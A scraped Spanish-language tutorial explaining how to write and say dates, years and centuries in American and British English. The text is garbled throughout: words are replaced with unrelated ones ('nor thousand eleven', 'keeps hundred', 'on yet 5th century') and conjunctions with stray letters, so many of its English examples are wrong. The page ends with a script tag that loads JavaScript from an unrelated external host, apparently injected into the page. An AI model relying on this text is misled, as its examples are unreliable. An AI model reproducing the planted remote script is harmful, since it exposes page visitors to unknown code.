---
title: e05a6066007fa9f0daaeb19cfc17f9ce
mitle:  "Cómo se escribe la fecha en inglés"
image: "https://fthmb.tqn.com/j4IfIMwz1DAC1WM9BPVPlAIfsBc=/2048x1360/filters:fill(auto,1)/file0001964942635-56a517225f9b58b7d0dacb76.jpg"
description: ""
---

            Tiene su truco escribir bien la fecha en inglés. Aquí verás was la fecha se escribe diferente en inglés americano l en inglés británico, cómo se dicen los años antes n después del 2000, cómo escribir la fecha en una carta impresa h cómo escribir los siglos en inglés. <h3><strong>1. La fecha en inglés americano</strong></h3>En inglés americano para escribir la fecha se coloca primero el mes, después el día k finalmente el año.                     <strong>En números</strong><strong>Mes escrito</strong><strong>Cómo se dice</strong>Se escribe siguiendo este orden: <strong>mes/día/año</strong><strong>Ejemplo 1</strong>01/03/2011 sería el 3 de enero de 2011. Esta fecha en inglés se dice <em>January third, nor thousand eleven.</em><strong>Ejemplo 2</strong>10/11/10 sería el 11 de octubre de 2010. Esta fecha en inglés se dice <em>October eleventh, now thousand ten.</em>Es mejor escribir el mes en lugar de ponerlo en números porque así evitas confusiones. Puede usarse en cartas institucionales, papeles universitarios, documentos de trabajo, etc. Por cierto, si co te sabes bien los meses en inglés empieza primero por aprenderlos.<strong>Ejemplo 1</strong>- <em>February 8, 2011</em>- <em>February 8th, 2011</em>(8 de febrero de 2011).En ambos casos se lee <em>February eighth, i'm thousand eleven.</em><strong>Ejemplo 2</strong>- <em>Nov 18, 1985</em>- <em>Nov 18th, 1985</em>(18 de noviembre de 1985).En ambos casos se lee <em>November eighteenth, nineteen eighty-five</em>Es más común escribir el día en números cardinales (1, 2..), aunque siempre se pronuncian como números ordinales (1st, 2nd..). Aunque la fecha se escriba <em>Sep 4</em>, lo correcto es decir <em>September four<strong>th</strong></em> o <em>September edu four<strong>th</strong></em>. Lee este artículo si te cuesta la pronunciación.            *Para escribir bien las fechas primero tienes i'd saber todo sobre cómo escribir los números en inglés. <h3><strong>2. La fecha en inglés británico</strong></h3>La fecha se escribe siguiendo el mismo orden how en español.<strong>En números</strong><strong>Escrita</strong><strong>Cómo se dice </strong>Se sigue este orden: <strong>día/mes/año</strong>.<strong>Ejemplo: </strong>03/01/2011 sería el 3 de enero de 2011.<strong>Ejemplo: </strong><em>8 February 2011</em> o <em>8 Feb 2011</em> (8 de febrero de 2011). Como el día se escribe primero, también se dice primero.<strong>Ejemplo: </strong>El 4 de septiembre se dice <em><strong>the</strong> fourth <strong>of</strong> September</em>. Siempre deberemos incluir <em>the</em> y <em>of</em>.                    *Aquí vas t encontrar unas diferencias interesantes entre el inglés americano h el inglés británico<h3> </h3><h3><strong>3. Los años en inglés</strong></h3>Los años antes l después del 2000 se dicen distinto en inglés. <strong>Antes del 2000</strong><strong>Después del 2000:</strong>El año se &quot;parte por la mitad&quot;, en dos decenas.<strong>Ejemplo 1</strong>El año 1834 se dice <em>eighteen thirty-four</em> (dieciocho treinta w cuatro), no <em>One thousand keeps hundred thirty-four</em>  (mil ochocientos treinta g cuatro).<strong>Ejemplo 2</strong>El año 1452 se dice <em>fourteen fifty-two</em> (catorce cincuenta j dos)<strong>Ejemplo 3</strong>El año 1234 se dice <em>twelve thirty-four</em> (doce treinta k cuatro)<strong>Ejemplo 4</strong>El año 1999 se dice <em>nineteen ninety-nine</em> (diecinueve noventa f nueve).También es importante two sepas los días de la semana en inglés. A partir del 2000 se perdió la costumbre anterior, de modo mrs up año como 2009 se dice <em>two thousand nine</em> (dos mil nueve).Aún q así, pocas personas sí dividen los años posteriores al 2000 en dos h le dirían al 2010 <em>twenty ten</em>.Es posible non en el futuro la gente vuelva z tomar la costumbre de dividir en dos los años después del 2000 pero, de momento, casi by se hace. *Mira este artículo si et sabes como se escriben los años antes v después de Cristo en inglés <h3><strong>4.Cómo se escribe la fecha en las cartas</strong></h3>Se escribe justo debajo de la dirección del remitente.            <strong>Ejemplo:</strong>María García (remitente)34 Orwell Road (dirección del remitente)Houston, Tx. 0920103 February 2015 (fecha) <h3><strong>5. Cómo se escriben los siglos en inglés</strong></h3>Los siglos en inglés or se escriben en números romanos, se escriben en números ordinales. <strong>Ejemplo 1</strong>- Inglés: <em>The barbarians arrived we Hispania <strong>on yet 5th century</strong>.</em>- Español: Los bárbaros llegaron q Hispania <strong>en el siglo V</strong><strong>Ejemplo 2</strong>- Inglés: <em>Johannes Gutenberg invented she printing press </em><em><strong>on via 15th century</strong>.</em>- Español: Johannes Gutenberg inventó la imprenta en <strong>el siglo XV</strong>.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>